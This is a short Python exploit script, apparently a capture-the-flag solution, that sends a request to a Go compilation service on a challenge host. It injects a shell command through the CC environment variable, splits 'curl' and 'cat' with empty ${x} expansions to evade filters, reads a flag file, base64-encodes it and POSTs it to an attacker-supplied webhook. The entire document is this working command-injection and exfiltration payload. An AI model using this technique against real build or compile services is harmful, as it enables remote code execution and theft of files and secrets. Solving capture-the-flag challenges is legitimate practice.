import requests
import sys

def exploit():
    if len(sys.argv) != 2:
        print("Usage: python3 exploit.py <webhook_url>")
        sys.exit(1)

    YOURhost = sys.argv[1]

    url = "http://cha-thjcc.scint.org:20000/mygolang"

    headers = {
        "Host": "cha-thjcc.scint.org:20000",
        "Content-Type": "application/json",
        "Connection": "keep-alive"
    }

    data = {
        "env": {
            "CC": "sh -c \"cu${x}rl " + YOURhost + " -X POST -d $(c${x}at /app/flag.mygo|base64|tr -d '\\n')\""
        },
        "code": 
    """
    package main
    import \"C\"

    func main() {
        println(\"Naup\")
    }
    """
    }

    response = requests.post(url, headers=headers, json=data)

    print("Status Code:", response.status_code)
    print("[Success] Check your host!")

exploit()
